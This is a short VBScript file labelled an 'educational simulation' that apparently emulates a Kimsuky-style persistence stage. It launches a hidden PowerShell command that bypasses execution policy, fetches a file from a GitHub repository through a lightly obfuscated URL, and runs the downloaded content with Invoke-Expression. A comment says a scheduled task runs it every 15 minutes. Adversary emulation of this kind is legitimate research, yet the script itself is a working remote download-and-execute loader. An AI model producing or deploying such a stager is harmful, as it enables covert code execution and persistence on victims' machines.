' shibaa.vbe - Educational Simulation
' Persistence wrapper: ran by scheduled task every 15 minutes.

Set sh = CreateObject("WScript.Shell")

' Same as first.ini but note: this is fetched every 15min by the task
psCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
        """$x='apple_wolf_https://api.github.com/repos/ccxxrr12/bahubali/contents/help.ini';" & _
        "$x=$x.Replace('apple_wolf_','');" & _
        "$h=@{'User-Agent'='kimsuky-demo';'Accept'='application/vnd.github.v3.raw'};" & _
        "$c=(Invoke-WebRequest -Uri $x -Headers $h -UseBasicParsing).Content;" & _
        "if ($c -is [byte[]]) { $c = [System.Text.Encoding]::UTF8.GetString($c) };" & _
        "Invoke-Expression $c"""

sh.Run psCmd, 0, False